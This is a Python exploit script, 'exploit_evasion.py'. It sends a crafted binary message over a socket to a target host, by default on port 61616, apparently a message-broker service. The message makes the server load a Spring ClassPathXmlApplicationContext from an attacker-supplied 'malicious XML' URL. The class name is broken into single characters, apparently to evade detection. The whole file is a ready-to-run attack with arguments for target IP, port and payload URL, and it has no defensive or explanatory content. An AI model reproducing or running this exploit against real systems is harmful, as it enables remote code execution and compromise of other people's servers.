import socket
import argparse

def main(ip, port, url):
    if not ip or not url:
        print("Usage: exploit_evasion.py -i <ip> -p <port> -u <url>")
        return

    class_name = "org.springframework.context.support." + "".join([
        "C","l","a","s","s","P","a","t","h","X","m","l",
        "A","p","p","l","i","c","a","t","i","o","n",
        "C","o","n","t","e","x","t"
    ])
    message = url
    header = "1f00000000000000000001"
    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message)
    payload = int2hex(len(body) // 2, 8) + body
    data = bytes.fromhex(payload)

    print(f"[*] Sending exploit to {ip}:{port}")
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((ip, int(port)))
    conn.send(data)
    conn.close()

def string2hex(s):
    return s.encode().hex()

def int2hex(i, n):
    return format(i, '0{}x'.format(n))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", help="Target IP")
    parser.add_argument("-p", "--port", default="61616", help="Target Port")
    parser.add_argument("-u", "--url", help="URL to malicious XML")
    args = parser.parse_args()
    main(args.ip, args.port, args.url)
